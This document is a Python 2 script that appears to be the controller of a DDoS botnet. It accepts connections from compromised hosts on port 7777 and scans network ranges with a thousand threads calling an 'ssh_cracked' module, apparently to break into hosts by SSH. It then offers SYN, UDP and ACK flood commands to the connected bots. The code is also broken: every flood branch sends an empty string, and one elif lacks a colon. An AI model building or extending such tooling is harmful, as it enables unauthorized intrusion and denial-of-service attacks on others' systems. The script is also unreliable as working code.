#!/usr/bin/python

import sys
import os
import socket
import Queue
import netaddr
import threading


def useage():
    print '''-h or --help   **---Help function
             -l or --alive  **---View the current live host
             -s or --scan   **---Scarch the network segment
             -a or --attack   **---Perform an attack
    '''
def useage_command():
    print '''Please choose your attack mode:
             -S or --syn    **---syn flood
             -U or --udp    **---udp flood
             -A or --ack    **---ack flood
    '''

live_host=Queue.Queue()
target_host=Queue.Queue()
server_listen_list_queue=Queue.Queue()
search_results=Queue.Queue()

def socket_listen():
    global live_host
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(('192.168.9.118',7777))
    server.listen(10000)

    while True:
        live_host.put(server.accept())


def main():
    global live_host
    global target_host
    global server_listen_list_queue
    global search_results


    Current_path=os.getcwd()
    try:
        sys.path.append(Current_path+'/modules')
    except:
        print 'import Error!'
        sys.exit(0)
    else:
        import ssh_cracked


    for i in range(5):
        th=threading.Thread(target=socket_listen)
        th.start()
        server_listen_list_queue.put(th)


    while True:
        command=raw_input('Prism_Program:>>')
        if command == '-h' or command =='--help':
            useage()
            continue
        elif command == '--alive' or command =='-l':
            print str(live_host.qsize())+'Host computer'
        elif command == '--scan' or command=='-s':
            ip_network_segment=raw_input('Please enter the segment you want to search for:')
            Net_list=netaddr.IPNetwork(ip_network_segment)
            for Net in Net_list:
                target_host.put(str(Net))
            for i in range(1000):
                th=threading.Thread(target=ssh_cracked.scan,args=(target_host,search_results))
                th.start()
        elif command =='-a' or command =='--attack':
            if live_host.empty():
                print 'There is no currently no host available'
                continue
            useage_command()
            command_choice=raw_input('Please enter you choice:')
            l_h_q=Queue.Queue()
            if command_choice == '-S' or command_choice =='--syn':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            elif command_choice == '-U' or command_choice =='--udp':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            elif command_choice == '-A' or command_choice =='--ack'
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            while not l_h_q.empty():
                x=l_h_q.get()
                live_host.put(x)


if __name__ == '__main__':
    main()
